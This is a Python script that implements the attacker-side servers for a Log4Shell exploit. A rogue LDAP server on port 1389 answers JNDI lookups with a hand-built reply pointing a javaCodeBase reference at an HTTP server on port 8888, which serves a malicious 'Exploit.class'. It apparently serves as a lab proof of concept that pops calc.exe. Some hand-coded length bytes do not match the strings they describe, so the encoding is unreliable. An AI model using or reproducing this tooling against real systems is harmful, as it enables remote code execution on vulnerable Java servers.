#!/usr/bin/env python3
import socket
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler
import os

class SimpleLDAPServer:
    def __init__(self):
        self.ldap_port = 1389
        self.http_port = 8888

    def handle_ldap(self, conn, addr):
        print(f"[LDAP] Connection from {addr[0]}:{addr[1]}")

        try:
            # Read bind request
            data = conn.recv(1024)
            print(f"[LDAP] Received bind request ({len(data)} bytes)")

            # Send bind response (success)
            bind_resp = bytes([
                0x30, 0x0c,  # SEQUENCE
                0x02, 0x01, 0x01,  # messageID: 1
                0x61, 0x07,  # BindResponse
                0x0a, 0x01, 0x00,  # resultCode: success
                0x04, 0x00,  # matchedDN: empty
                0x04, 0x00   # diagnosticMessage: empty
            ])
            conn.send(bind_resp)
            print("[LDAP] Sent bind response")

            # Read search request
            data = conn.recv(1024)
            print(f"[LDAP] Received search request ({len(data)} bytes)")

            # Send minimal search result with codebase
            # This is the simplest possible LDAP response that works
            search_result = bytes([
                # Message envelope
                0x30, 0x4a,  # SEQUENCE (74 bytes)
                0x02, 0x01, 0x02,  # messageID: 2

                # SearchResultEntry
                0x64, 0x45,  # APPLICATION 4 (69 bytes)
                0x04, 0x07,  # objectName: "Exploit"
            ])
            search_result += b"Exploit"

            # Attributes
            search_result += bytes([
                0x30, 0x3a,  # SEQUENCE (58 bytes)

                # javaCodeBase attribute
                0x30, 0x1f,  # SEQUENCE
                0x04, 0x0c,  # attributeType
            ])
            search_result += b"javaCodeBase"
            search_result += bytes([0x31, 0x0f])  # SET
            search_result += bytes([0x04, 0x0d])  # OCTET STRING
            search_result += b"http://127.0.0.1:8888/"

            # objectClass attribute
            search_result += bytes([
                0x30, 0x17,  # SEQUENCE
                0x04, 0x0b,  # attributeType
            ])
            search_result += b"objectClass"
            search_result += bytes([0x31, 0x08])  # SET
            search_result += bytes([0x04, 0x06])  # OCTET STRING
            search_result += b"person"

            conn.send(search_result)
            print("[LDAP] Sent SearchResultEntry")

            # Send SearchResultDone
            search_done = bytes([
                0x30, 0x0c,  # SEQUENCE
                0x02, 0x01, 0x02,  # messageID: 2
                0x65, 0x07,  # SearchResultDone
                0x0a, 0x01, 0x00,  # resultCode: success
                0x04, 0x00,  # matchedDN: empty
                0x04, 0x00   # diagnosticMessage: empty
            ])
            conn.send(search_done)
            print("[LDAP] Sent SearchResultDone")

        except Exception as e:
            print(f"[LDAP] Error: {e}")
        finally:
            conn.close()

    def start_ldap(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', self.ldap_port))
        sock.listen(5)
        print(f"[+] LDAP server listening on 0.0.0.0:{self.ldap_port}")

        while True:
            conn, addr = sock.accept()
            thread = threading.Thread(target=self.handle_ldap, args=(conn, addr))
            thread.daemon = True
            thread.start()

    def start_http(self):
        class Handler(SimpleHTTPRequestHandler):
            def do_GET(self):
                print(f"[HTTP] {self.client_address[0]} requested: {self.path}")

                if self.path in ['/', '/Exploit.class', '/Exploit']:
                    try:
                        with open('Exploit.class', 'rb') as f:
                            content = f.read()

                        self.send_response(200)
                        self.send_header('Content-Type', 'application/octet-stream')
                        self.send_header('Content-Length', str(len(content)))
                        self.end_headers()
                        self.wfile.write(content)
                        print(f"[+] Served Exploit.class ({len(content)} bytes)")
                        print("[!!!] EXPLOIT DELIVERED - Check for calc.exe!")
                    except FileNotFoundError:
                        print("[!] Exploit.class not found")
                        self.send_error(404)
                else:
                    self.send_error(404)

            def log_message(self, format, *args):
                return

        os.chdir(os.path.dirname(os.path.abspath(__file__)) or '.')
        httpd = HTTPServer(('0.0.0.0', self.http_port), Handler)
        print(f"[+] HTTP server listening on 0.0.0.0:{self.http_port}")
        httpd.serve_forever()

    def run(self):
        print("=" * 50)
        print("Minimal Log4Shell LDAP Server")
        print("=" * 50)

        # Start LDAP in background
        ldap_thread = threading.Thread(target=self.start_ldap)
        ldap_thread.daemon = True
        ldap_thread.start()

        # Start HTTP in main thread
        try:
            self.start_http()
        except KeyboardInterrupt:
            print("\n[*] Shutting down...")

if __name__ == "__main__":
    server = SimpleLDAPServer()
    server.run()